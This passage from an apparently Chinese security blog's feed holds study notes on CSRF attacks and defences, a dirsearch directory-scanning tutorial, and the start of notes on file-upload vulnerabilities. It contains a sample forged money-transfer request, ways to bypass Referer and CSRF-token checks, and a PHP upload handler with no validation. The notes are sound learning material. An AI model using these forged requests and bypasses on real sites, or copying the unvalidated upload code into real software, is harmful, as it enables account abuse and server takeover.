        <content type="html"><![CDATA[<h1 id="6-1-csrf-漏洞描述"><a href="#6-1-csrf-漏洞描述" class="headerlink" title="6.1 csrf 漏洞描述"></a>6.1 csrf 漏洞描述</h1><p>CSRF 定义： 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者<br>session riding，通常缩写为 CSRF ， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。<br>简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h1 id="6-2-csrf-漏洞攻击原理"><a href="#6-2-csrf-漏洞攻击原理" class="headerlink" title="6.2 csrf 漏洞攻击原理"></a>6.2 csrf 漏洞攻击原理</h1><p>用户打开浏览器，访问登陆受信任的 A 网站</p><p>在用户信息通过验证后，服务器会返回一个 cookie 给浏览器，用户登陆网站 A 成功，可以正常发送请求到网站 A</p><p>用户未退出网站 A，在同一浏览器中，打开一个危险网站 B</p><p>网站 B 收到用户请求后，返回一些恶意代码，并发出请求要求访问网站 A</p><p>浏览器收到这些恶意代码以后，在用户不知情的情况下，利用 cookie 信息，向网站 A 发送恶意请求，网站A 会根据 cookie 信息以用户的权限去处理该请求，导致来自网站 B 的恶意代码被执行</p><h1 id="6-3-CSRF-漏洞攻击"><a href="#6-3-CSRF-漏洞攻击" class="headerlink" title="6.3 CSRF 漏洞攻击"></a>6.3 CSRF 漏洞攻击</h1><p>一个数据包</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">向apzx7账号afafaa<span class="variable">@qq</span>.com转账<span class="number">10000</span>的请求</span><br><span class="line">www.alipay/<span class="string">?p</span>ay.html?name=apzx7&amp;account=afafaa<span class="variable">@qq</span>.com&amp;money=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www.apzx.com首页或某个页面写上一个加载数据包代码（付款数据包）</span><br></pre></td></tr></table></figure><p>受害者登录上去，同时访问<a href="http://www.apzx.com/">www.apzx.com</a>  等于触发付款数据包</p><p>csrf攻击（跨站请求伪造）</p><p>跨站<a href="http://www.apzx.com请求/">www.apzx.com请求</a></p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">请求伪造www.alipay/?pay.html?<span class="attr">name</span><span class="operator">=</span>apzx7<span class="variable">&amp;account</span>=afafaa@qq.com<span class="variable">&amp;money</span>=<span class="number">10000</span></span><br></pre></td></tr></table></figure><p>—-没防护且能绕过</p><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>1.需要求情伪造数据包；<br>2.无过滤防护，有过滤能绕过；<br>3.受害者需触发（诱惑）</p><p>来到 csrf（get）漏洞，输入用户登录后发现修改密码处没有任何验证，存在 csrf 攻</p><p>击，通过 csrf 漏洞攻击修改资料。</p><p>使用 burpsuite 构造攻击 exp 输入信息后 选择 generate csrf-poc</p><p>复制下来 写入到 poc.html</p><p>受害者受到攻击的途径有</p><p>1.受害者登录网站后，没有退出的情况下，访问网站 b 触发</p><p>2.在存在漏洞的网站，挖掘 xss 漏洞，自动调用这 poc.html</p><p>受害者访问 poc.html 点击 poc.html</p><h1 id="6-4-CSRF-防御方案"><a href="#6-4-CSRF-防御方案" class="headerlink" title="6.4 CSRF 防御方案"></a>6.4 CSRF 防御方案</h1><p>1.增加 Token 验证（常用做法）</p><p>对关键操作增加 Token 参数，token 必须随机，每次都不一样</p><p>2 关于安全的会话管理（避免会话被利用）</p><p>不要在客户端保存敏感信息（比如身份验证信息）</p><p>退出、关闭浏览器时的会话过期机制</p><p>设置会话过机制，比如 15 分钟无操作，则自动登录超时</p><p>3 访问控制安全管理</p><p>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</p><p>敏感信息的修改使用 POST，而不是 GET</p><p>通过 HTTP 头部中的 REFERER 来限制原页面</p><p>4 增加验证码</p><p>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</p><h1 id="6-5-同源策略"><a href="#6-5-同源策略" class="headerlink" title="6.5 同源策略"></a>6.5 同源策略</h1><p>监测当前数据包是否为内部产生的</p><p>基于严谨的检测绕过；<br>基于不严谨的监测绕过</p><p>检测是否同源：<br>目标<br>攻击</p><p>完全对比：一样才行<br>无法更改来源<br>配合xss和上传（触发数据包保证是同一来源）<br>匹配对比：有就行<br>条件：点击过来的</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">0.0.0.0</span>/<span class="number">8.8.8.8</span>/<span class="number">11</span>.html（目录形式）</span><br></pre></td></tr></table></figure><p>逻辑判断隐患：置空</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;&quot;</span><span class="literal">no</span>-referrer&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="PHP-同源检测的代码示例"><a href="#PHP-同源检测的代码示例" class="headerlink" title="PHP 同源检测的代码示例"></a>PHP 同源检测的代码示例</h3><p>同源检测是一种在服务器端验证请求来源的方法，通过检查请求的来源URL和目标URL是否匹配，可以防止跨域请求被执行。以下是一些常见的实现方法和代码示例。</p><h4 id="1-使用-HTTP-REFERER-检测"><a href="#1-使用-HTTP-REFERER-检测" class="headerlink" title="1. 使用 HTTP_REFERER 检测"></a>1. 使用 <code>HTTP_REFERER</code> 检测</h4><p><code>HTTP_REFERER</code> 是一个 HTTP 头部字段，表示请求的来源页面。通过检查 <code>HTTP_REFERER</code>，可以验证请求是否来自合法的来源。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检测来源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkReferrer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$expectedReferrer</span> = <span class="string">&quot;http://example.com&quot;</span>; <span class="comment">// 期望的来源页面</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] !== <span class="variable">$expectedReferrer</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非法访问&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理表单提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检测来源</span></span><br><span class="line">    <span class="title function_ invoke__">checkReferrer</span>();</span><br><span class="line">    <span class="comment">// 获取用户输入的数据</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// 输出用户输入的数据</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;姓名：<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;邮箱：<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;检测来源示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;检测来源示例&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;姓名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;邮箱：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>HTTP_REFERER</code> 可以被客户端伪造，因此这种方法并不完全可靠。</p><h4 id="HTTP-REFERER绕过"><a href="#HTTP-REFERER绕过" class="headerlink" title="HTTP_REFERER绕过"></a>HTTP_REFERER绕过</h4><p>抓包修改REFERER值为同网站；</p><h4 id="2-使用-HTTP-ORIGIN-检测"><a href="#2-使用-HTTP-ORIGIN-检测" class="headerlink" title="2. 使用 HTTP_ORIGIN 检测"></a>2. 使用 <code>HTTP_ORIGIN</code> 检测</h4><p><code>HTTP_ORIGIN</code> 是一个 HTTP 头部字段，表示请求的来源域。通过检查 <code>HTTP_ORIGIN</code>，可以验证请求是否来自合法的域。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检测来源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkOrigin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$allowedOrigins</span> = <span class="keyword">array</span>(<span class="string">&#x27;https://example.com&#x27;</span>, <span class="string">&#x27;https://www.example.com&#x27;</span>); <span class="comment">// 允许的合法来源</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>], <span class="variable">$allowedOrigins</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非法访问&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理表单提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检测来源</span></span><br><span class="line">    <span class="title function_ invoke__">checkOrigin</span>();</span><br><span class="line">    <span class="comment">// 获取用户输入的数据</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// 输出用户输入的数据</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;姓名：<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;邮箱：<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;检测来源示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;检测来源示例&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;姓名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;邮箱：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>HTTP_ORIGIN</code> 也可以被客户端伪造，因此这种方法同样不完全可靠。</p><h4 id="3-使用-CSRF-Token-验证"><a href="#3-使用-CSRF-Token-验证" class="headerlink" title="3. 使用 CSRF Token 验证"></a>3. 使用 CSRF Token 验证</h4><p>给每一个数据包上一个编号；</p><p>CSRF Token 是一种常见的防护 CSRF 攻击的方法。通过生成和验证 CSRF Token，可以确保请求的来源是合法的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成并存储 CSRF Token</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateCSRFToken</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 CSRF Token 是否有效</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateCSRFToken</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] === <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理表单提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查 CSRF Token</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) || !<span class="title function_ invoke__">validateCSRFToken</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;CSRF Token 验证失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取用户输入的数据</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// 输出用户输入的数据</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;姓名：<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;邮箱：<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成 CSRF Token</span></span><br><span class="line"><span class="variable">$csrfToken</span> = <span class="title function_ invoke__">generateCSRFToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSRF Token 示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF Token 示例&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;csrf_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$csrfToken</span>; ?&gt;&quot;</span> /&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;姓名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;邮箱：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：CSRF Token 是一种更可靠的方法，因为它通过会话存储和验证，难以被伪造。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>token：（不严谨）</p><p>复用：tokan<br>删除     不带该参数<br>置空      token&#x3D;</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>**使用 <code>HTTP_REFERER</code> 或 <code>HTTP_ORIGIN</code>**：这些方法简单易用，但不够安全，因为这些头部字段可以被客户端伪造。</li><li><strong>使用 CSRF Token</strong>：这是一种更安全的方法，通过生成和验证 CSRF Token，可以有效防止 CSRF 攻击。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dirseach的安装和使用</title>
      <link href="/2025/05/21/dirseach%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/05/21/dirseach%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://so.csdn.net/so/search?q=dirsearch&spm=1001.2101.3001.7020">dirsearch</a>是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p><p>dirsearch下载地址： <a href="https://github.com/maurosoria/dirsearch" title="GitHub - maurosoria/dirsearch: Web path scanner">GitHub - maurosoria&#x2F;dirsearch: Web path scanner</a></p><p>运行环境：必须安装python3.7或更高版本</p><h2 id="一、Dirsearch是什么？"><a href="#一、Dirsearch是什么？" class="headerlink" title="一、Dirsearch是什么？"></a>一、Dirsearch是什么？</h2><p>Dirsearch是一个用于探测WEB服务器下的<strong>敏感文件&#x2F;目录</strong>的命令行工具。</p><h2 id="二、安装和使用"><a href="#二、安装和使用" class="headerlink" title="二、安装和使用"></a>二、安装和使用</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>1.1选择以下安装选项之一：</p><ul><li>使用 <strong>git</strong> 安装：（<strong>推荐</strong><code>git clone https://github.com/maurosoria/dirsearch.git --depth 1</code>)</li><li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip" title="在此处下载">在此处下载</a></li><li>使用 Docker 安装：（更多信息可以<a href="https://github.com/maurosoria/dirsearch#support-docker" title="在这里">在这里</a>找到<code>docker build -t &quot;dirsearch:v0.4.3&quot; .</code>)</li><li>使用 PyPi 安装：或<code>pip3 install dirsearch``pip install dirsearch</code></li><li>使用 Kali Linux 安装：（已弃用）<code>sudo apt-get install dirsearch</code></li></ul><p>1.2下载zip包，解压后进入控制台，输入下面命令进行安装依赖：</p><blockquote><p>pip3 install -r requirements.txt        &#x2F;&#x2F;安装依赖</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c3d17841af4d685b8bb7a98de8270d51.png"></p><blockquote><p> python dirsearch.py -h        &#x2F;&#x2F;查看帮助</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/41ac200e7abd9a1eb6311c40ccd5453c.png"></p><p> 帮助信息的简单翻译：</p><blockquote><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">-h, <span class="comment">--help                                 显示此帮助消息并退出</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a><strong>2.使用方法</strong></h2><h4 id="1-基本扫描命令"><a href="#1-基本扫描命令" class="headerlink" title="1. 基本扫描命令"></a>1. <strong>基本扫描命令</strong></h4><ul><li>扫描指定 URL：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com</span><br></pre></td></tr></table></figure></li><li>指定文件扩展名（如 <code>php,html,js</code>）：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -e php,html,js</span><br></pre></td></tr></table></figure></li><li>使用自定义字典文件：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -w /path/to/your/wordlist.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-高级选项"><a href="#3-高级选项" class="headerlink" title="3. 高级选项"></a>3. <strong>高级选项</strong></h4><ul><li><strong>递归扫描</strong>：使用 <code>-r</code> 参数进行递归扫描，可以发现更多隐藏的子目录。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -r</span><br></pre></td></tr></table></figure></li><li><strong>设置线程数</strong>：使用 <code>-t</code> 参数设置并发线程数，提高扫描速度。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -t 20</span><br></pre></td></tr></table></figure></li><li><strong>排除状态码</strong>：使用 <code>-x</code> 参数排除某些 HTTP 状态码，减少结果噪声。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -x 404,403</span><br></pre></td></tr></table></figure></li><li><strong>输出结果到文件</strong>：使用 <code>-o</code> 参数将结果保存到文件。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -o results.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-自定义字典"><a href="#4-自定义字典" class="headerlink" title="4. 自定义字典"></a>4. <strong>自定义字典</strong></h4><ul><li><code>dirsearch</code> 使用内置字典进行扫描，但你可以通过 <code>-w</code> 参数指定自定义字典文件。</li></ul><h3 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h3><h4 id="1-设置代理"><a href="#1-设置代理" class="headerlink" title="1. 设置代理"></a>1. <strong>设置代理</strong></h4><ul><li>使用 <code>--proxy</code> 参数指定代理服务器，隐藏真实 IP 地址。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-自定义请求头"><a href="#2-自定义请求头" class="headerlink" title="2. 自定义请求头"></a>2. <strong>自定义请求头</strong></h4><ul><li>使用 <code>-H</code> 参数定制请求头，例如添加 <code>User-Agent</code>。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -H <span class="string">&quot;User-Agent: IE&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-限制扫描速率"><a href="#3-限制扫描速率" class="headerlink" title="3. 限制扫描速率"></a>3. <strong>限制扫描速率</strong></h4><ul><li>使用 <code>--max-rate</code> 参数限制扫描速率，避免对目标服务器造成过大负载。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --max-rate 10</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-实时日志查看"><a href="#4-实时日志查看" class="headerlink" title="4. 实时日志查看"></a>4. <strong>实时日志查看</strong></h4><ul><li>通过 Web 控制台实时查看扫描日志和结果。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>合法性</strong>：仅在合法授权的情况下对目标进行扫描。未经授权的扫描可能违反法律和道德规范。</li><li><strong>性能</strong>：调整线程数和字典大小以平衡扫描速度和系统负载。</li></ul><p>通过这些基本和高级用法，你可以灵活地使用 <code>dirsearch</code> 来发现网站上的隐藏文件和目录，从而提高安全性。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>        以上就是今天要讲的内容，本文演示了如何使用有效的Web目录暴力破解工具Dirsearch来扫描和搜索用户可能看不到的隐藏Web目录。<br>####################<br>免责声明：工具本身并无好坏，希望大家以遵守《网络安全法》相关法律为前提来使用该工具，支持研究学习，切勿用于非法犯罪活动，对于恶意使用该工具造成的损失，和本人及开发者无关。<br>####################</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/2025/05/17/upload/"/>
      <url>/2025/05/17/upload/</url>
      
        <content type="html"><![CDATA[<h1 id="2-1-基本原理"><a href="#2-1-基本原理" class="headerlink" title="2.1 基本原理"></a>2.1 基本原理</h1><p>文件上传漏洞是指由于程序员&#x3D;&#x3D;未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限&#x3D;&#x3D;<br>向服务器上传可执行的动态脚本文件。如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许</p><p>用户上传文件，如果&#x3D;&#x3D;过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中，&#x3D;&#x3D;</p><p>可以获取服务器的权限，或进一步危害服务器</p><h1 id="2-2-危害"><a href="#2-2-危害" class="headerlink" title="2.2 危害"></a>2.2 危害</h1><p>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell，</p><p>上传 webshell 后门 很方便地查看服务器信息，查看目录，执行系统命令等。</p><h1 id="2-3-有关文件上传的知识"><a href="#2-3-有关文件上传的知识" class="headerlink" title="2.3 有关文件上传的知识"></a>2.3 有关文件上传的知识</h1><h3 id="文件上传的过程"><a href="#文件上传的过程" class="headerlink" title="文件上传的过程"></a>文件上传的过程</h3><p>客户端：</p><ol><li>选择发送的文件</li><li>服务器接收</li><li>网站程序判断</li><li>临时文件</li><li>移动到指定的路径</li></ol><p>服务器：</p><ul><li>接收的资源程序</li></ul><h3 id="服务器接收资源代码"><a href="#服务器接收资源代码" class="headerlink" title="服务器接收资源代码"></a>服务器接收资源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span 